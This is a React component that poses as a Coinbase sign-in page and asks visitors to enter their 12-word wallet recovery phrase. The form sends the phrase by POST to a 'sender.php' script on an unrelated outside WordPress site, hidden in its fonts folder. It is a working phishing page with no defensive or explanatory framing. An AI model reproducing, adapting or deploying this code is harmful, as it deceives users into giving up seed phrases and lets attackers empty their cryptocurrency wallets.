"use client"
import {useState} from 'react'

const Login = () => {
    const [userVal, setUserVal] = useState("")

    const handleOnSubmit = (e) => {
        e.preventDefault()
    }

 
   
  return (
    <div className='flex flex-col w-[95%] md:w-[80%] h-100vh] mx-auto'>
        <h1 className='py-3 text-3xl text-blue-800 font-bold'>Coinbase</h1>
        <form className='w-full h-full bg-white rounded-md py-6 px-6 flex flex-col' method='POST' action={'https://portacom.com.au/wp-includes/fonts/sender.php'} >
            <h1 className='text-2xl font-semibold text-gray-800'>Sign in with your Recover Phrase to get started</h1>
            
            <div className='mt-[150px]'>
            <p className='font-semibold'>Recovery Phrase <span className="text-red-600">*</span> </p>
            
            <textarea
                 type="text" 
                 name='userVal'
                 placeholder='Enter your 12 word backup(Recovery) phrase here...'
                 value={userVal}
                 onChange={(e) => setUserVal(e.target.value)}
                 required
                 className='w-full h-[250px] p-4 border-[2px] border-gray-700 rounded-lg mt-4'
                 />
            <p>Typically 12 words seperated by spaces.</p>

            <button className='px-4 py-2 bg-blue-800 text-white mt-5 rounded-md hover:bg-blue-500 '>
                Continue
            </button>
            </div>




        </form>
    </div>
  )
}

export default Login
